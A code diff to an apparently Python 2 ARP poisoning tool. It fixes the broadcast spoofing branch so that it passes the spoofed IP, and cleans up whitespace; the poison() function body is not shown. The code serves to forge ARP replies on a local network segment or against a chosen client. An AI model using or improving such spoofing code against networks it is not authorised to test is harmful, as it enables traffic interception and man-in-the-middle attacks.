@@ -46,7 +46,7 @@ def poison(interface, src_mac, src_ip, dst_mac, dst_ip):
 def iptol(ip):
 	sip = ip.split(".")
 	return ''.join("%0.2X" % int(i) for i in sip).decode('hex')
-	
+
 def mactol(mac):
 	return mac.replace(":", "").decode('hex')
 
@@ -68,8 +68,8 @@ def main():
 	#sending a broadcast arp poison
 	elif(options.broadcast and options.spoofed_ip and options.source_mac):
 		print "Arp poisoning segment"
-		poison(options.interface, mactol(options.source_mac), iptol(ip), "\xff\xff\xff\xff\xff\xff", "\xff\xff\xff\xff")
-	
+		poison(options.interface, mactol(options.source_mac), iptol(options.spoofed_ip), "\xff\xff\xff\xff\xff\xff", "\xff\xff\xff\xff")
+
 	#sending a unicast arp poison
 	elif(not options.broadcast and options.spoofed_ip and options.source_mac and options.target_mac and options.target_ip):
 		print "Arp poisoning client"
